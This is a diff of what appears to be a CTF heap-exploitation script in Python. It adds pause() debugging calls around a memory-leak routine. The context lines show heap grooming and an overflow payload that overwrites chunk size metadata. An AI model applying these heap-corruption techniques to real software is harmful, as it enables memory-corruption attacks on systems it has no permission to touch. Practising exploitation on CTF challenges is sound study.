@@ -43,6 +43,7 @@ def m_build(io, mid, length, mcontent):
     io.send(mcontent)
 
 def m_leak(io):
+    pause()
     m_allloc(io, 0x60, 'a'*0x60)
     m_allloc(io, 0x10, 'b'*0x10)
     m_allloc(io, 0x10, 'c'*0x10)
@@ -50,9 +51,10 @@ def m_leak(io):
     m_allloc(io, 0x10, 'e'*0x10)
     m_destroy(io, 2)
     m_destroy(io, 1)
-    raw_input("what")
+    pause()
     payload = '0'*0x60 + p64(0) + p64(0x21) + chr(0x70)
     m_build(io, 0, len(payload), payload)
+    pause()
     m_allloc(io, 0x10, 'c'*0x10)
     m_allloc(io, 0x10, 'd'*0x10)
     m_destroy(io, 1)
@@ -94,4 +96,3 @@ if __name__ == '__main__':
     m_exploit(io)
     raw_input("over?")
     io.close()
-
